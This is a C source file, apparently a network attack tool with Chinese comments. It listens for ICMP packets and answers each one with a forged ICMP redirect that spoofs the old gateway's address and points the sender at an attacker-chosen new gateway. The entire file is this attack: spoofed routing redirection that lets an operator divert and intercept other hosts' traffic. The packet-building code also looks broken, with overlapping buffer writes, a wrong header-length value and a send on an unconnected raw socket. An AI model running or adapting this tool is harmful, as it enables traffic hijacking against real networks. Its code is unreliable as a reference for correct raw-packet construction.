#include <sys/types.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/tcp.h>
#include <netinet/ip_icmp.h>
#include <strings.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>

char send_buff[56] =  {0};
int sockfd;


struct sockaddr_in oldGW;
struct sockaddr_in newGW;

unsigned short in_cksum(unsigned short *addr, int len)
{
    int sum = 0;
    unsigned short res = 0;
    while (len > 1)
    {
        sum += *addr++;
        len -= 2;
        // printf("sum is %x.\n",sum);
    }
    if (len == 1)
    {
        *((unsigned char *)(&res)) = *((unsigned char *)addr);
        sum += res;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    res = ~sum;
    return res;
}

int main(int argc, char *argv[])
{

    if (argc != 3)
    {
        printf("please input new gatewall and old gatewall");
        exit(1);
    }

    if (inet_aton(argv[1], &newGW.sin_addr) == 0 ||inet_aton(argv[2], &oldGW.sin_addr) == 0 )
    {
        printf("bad ip address\n");
        exit(1);
    }

    // 接受所有ICMP的IP包
    int recvfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);

    // 发送的icmp重定向包
    struct icmp *send_icmp = (struct icmp *)(send_buff+28);
    struct icmp *recv_icmp;

    // 发送的文件描述符
    if ((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) < 0)
    {
        perror("socket error!");
        exit(1);
    }

    send_icmp->icmp_type = ICMP_REDIRECT;
    send_icmp->icmp_code = ICMP_REDIR_HOST;
    send_icmp->icmp_cksum = 0;


    char recv_buff[1024];
    int n;
    int count = 0;
    while (1)
    {
        memset(recv_buff, 0, 1024);
        // 接受所有的ICMP数据
        if ((n = recvfrom(recvfd, recv_buff, sizeof(recv_buff), 0, NULL, NULL)) < 0)
        {
            perror("receive error!\n");
            exit(1);
        };
        struct ip *ip = (struct ip *)recv_buff;
        // +1 指跳过一个IP头
        struct icmp *recv_icmp = (struct icmp *)(ip + 1);
        printf("%d ip is %s\n ", count, inet_ntoa(ip->ip_src));
        count++;
        
        // 新的网关
        send_icmp->icmp_hun.ih_gwaddr = newGW.sin_addr;

        // 原ip包头+前8位
        memcpy(send_buff+20,recv_buff,28*sizeof(char));

        send_icmp->icmp_cksum = 0;
        send_icmp->icmp_cksum = in_cksum((unsigned short *)send_icmp, 8);
        // 填要发送的ip数据包头
        struct ip *send_ip = (struct ip*)send_buff;
        send_ip->ip_v = 4;
        send_ip->ip_hl = (unsigned int)20;
        send_ip->ip_len = 56;
        send_ip->ip_tos = IPPROTO_ICMP;
        send_ip->ip_src = oldGW.sin_addr;
        send_ip->ip_dst = ip->ip_src;
        send_ip->ip_ttl = 64;
    
        send(sockfd, (char*) send_icmp, sizeof(*send_icmp), 0);
    }

    return 0;
}